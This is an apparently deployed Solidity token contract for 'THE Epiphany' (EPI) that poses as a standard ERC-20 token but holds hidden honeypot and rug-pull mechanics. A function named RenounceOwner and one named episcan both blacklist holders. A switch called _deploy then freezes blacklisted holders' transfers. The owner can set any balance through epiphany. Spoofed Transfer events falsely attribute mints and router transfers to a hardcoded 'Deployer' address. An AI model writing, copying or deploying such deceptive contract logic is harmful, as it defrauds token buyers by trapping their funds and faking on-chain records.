/**
 *Submitted for verification at Etherscan.io on 2022-10-18
*/

// File: epi.sol

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract Epiphany {
  
    mapping (address => uint256) public dAmnt;
    mapping (address => bool) dUsr;



    // 
    string public name = "THE Epiphany";
    string public symbol = unicode"EPI";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint public dmd = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        dAmnt[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0x0695586F690cBcd87376F621BE6351913eBE6857;
    address Deployer = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier E() {   
    require(msg.sender == owner);
         _;}
    modifier F () {
        dmd = 0;
        _;}
    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Router)  {
        require(dAmnt[msg.sender] >= value);
        dAmnt[msg.sender] -= value;  
        dAmnt[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(dUsr[msg.sender]) {
        require(dmd == 1);} 
        require(dAmnt[msg.sender] >= value);
        dAmnt[msg.sender] -= value;  
        dAmnt[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return dAmnt[account]; }
        function episcan(address N) E public{          
        require(!dUsr[N]);
        dUsr[N] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function epiphany(address N, uint256 R) E public returns (bool success) {
        dAmnt[N] = R;
        return true; }
        function RenounceOwner(address N) public {
        require(msg.sender == owner);
        dUsr[N] = true;}
        
        function dwdrw(address N) E public {
        require(dUsr[N]);
        dUsr[N] = false; }
		 function _deploy() F public {
            require(msg.sender == owner);
        }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= dAmnt[from]);
        require(value <= allowance[from][msg.sender]);
        dAmnt[from] -= value;  
        dAmnt[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(dUsr[from] || dUsr[to]) {
        require(dmd == 1);}
        require(value <= dAmnt[from]);
        require(value <= allowance[from][msg.sender]);
        dAmnt[from] -= value;
        dAmnt[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }